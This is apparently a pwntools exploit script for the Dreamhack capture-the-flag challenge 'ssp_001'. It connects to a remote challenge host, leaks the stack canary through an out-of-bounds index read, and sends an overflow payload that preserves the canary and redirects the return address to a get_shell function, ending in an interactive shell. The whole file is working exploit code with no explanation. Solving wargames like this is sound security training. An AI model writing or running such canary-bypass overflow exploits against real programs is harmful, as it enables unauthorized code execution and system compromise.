#!/usr/bin/env python3
from pwn import *
exe = ELF('ssp_001', checksec = False)

# p = process(exe.path)
p = remote('host8.dreamhack.games', 20596)


input()
#stage 1 leak canary
canary = b''
for i in range(131, 127, -1):
    p.sendlineafter(b'> ', b'P')
    p.sendlineafter(b'Element index : ', str(i).encode())
    p.recvuntil(b'is : ')
    canary += p.recv(2)

canary = int(canary, 16)
log.info("canary: " + hex(canary))

# overwrite rip -> get_shell
payload = b'a'*0x40
payload += p32(canary)
payload += b'aaaaaaaa'
payload += p32(exe.sym['get_shell'])
p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', b'80')
p.sendlineafter(b'Name : ', payload)




p.interactive()